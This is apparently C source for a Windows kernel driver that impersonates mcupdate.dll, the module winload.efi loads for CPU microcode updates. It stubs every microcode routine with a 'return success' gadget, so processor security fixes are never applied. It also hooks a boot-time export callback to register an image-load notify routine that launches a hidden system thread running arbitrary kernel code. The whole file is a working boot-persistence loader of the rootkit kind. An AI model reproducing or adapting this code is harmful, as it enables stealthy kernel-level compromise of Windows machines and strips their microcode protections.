#include "entry.h"

/* exported symbol used by the winload.efi to identify mcupdate module */
EXTERN_C __declspec(dllexport) uint64_t McImageInfo = 0x3800000001LL;

/* success gaget */
uint8_t gaget[] =
{
	0x33, 0xC0, /* xor eax, eax */
	0xC3	    /* ret	    */
};

void ThreadWrapper()
{
	PsRemoveLoadImageNotifyRoutine(LoadImageNotifyRoutine);

	/* mess with the thread here before it reaches main */

	MainThread();
}

VOID LoadImageNotifyRoutine(_In_opt_ PUNICODE_STRING FullImageName, _In_ HANDLE ProcessId, _In_ PIMAGE_INFO ImageInfo)
{
	HANDLE threadHandle;
	PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, (PKSTART_ROUTINE)ThreadWrapper, NULL);
}

/*!
*
* If this function return STATUS_NO_MEMORY then will be executed one more time during boot.
* We are not interested in that to happen.	
* 
!*/
NTSTATUS HalpMcUpdateExportData(uint64_t, uint64_t, uint64_t)
{
	/*!
	* we cant start PsCreateSystemThread here as the ntoskrnl is still in the initialization phrase
	* and the internal structures that are need for threads are not initialized yet
	!*/
	PsSetLoadImageNotifyRoutine(LoadImageNotifyRoutine);
	return STATUS_SUCCESS;
}

/*!
* 	
* 1st call -> OslpLoadMicrocode      (winload.efi)  [firmware context]
* 2st call -> HalpMcUpdateInitialize (ntoskrnl.exe) [application context]
* 3st call -> HalpMcUpdateInitialize (ntoskrnl.exe) [application context]
*
!*/
NTSTATUS DriverEntry(uint64_t* McpUpdateMicrocodeFunc, int64_t a2)
{
	/*	Simulate the original mcupdate.dll interface */

	McpUpdateMicrocodeFunc[0] = (uint64_t)&gaget;   /* UcpMicrocode    */
	McpUpdateMicrocodeFunc[1] = (uint64_t)&gaget;   /* UcpMicrocodeEx  */
	McpUpdateMicrocodeFunc[2] = (uint64_t)&gaget;   /* UcpLock         */
	McpUpdateMicrocodeFunc[3] = (uint64_t)&gaget;   /* UcpUnlock       */
	McpUpdateMicrocodeFunc[4] = (uint64_t)&gaget;   /* UcpPostUpdate   */
	McpUpdateMicrocodeFunc[5] = (uint64_t)&HalpMcUpdateExportData;	/* executed during boot in HalpMcExportAllData (ntoskrnl.exe) */
	McpUpdateMicrocodeFunc[6] = (uint64_t)&gaget;   /* UcpExportStatus */

	return STATUS_SUCCESS;
}
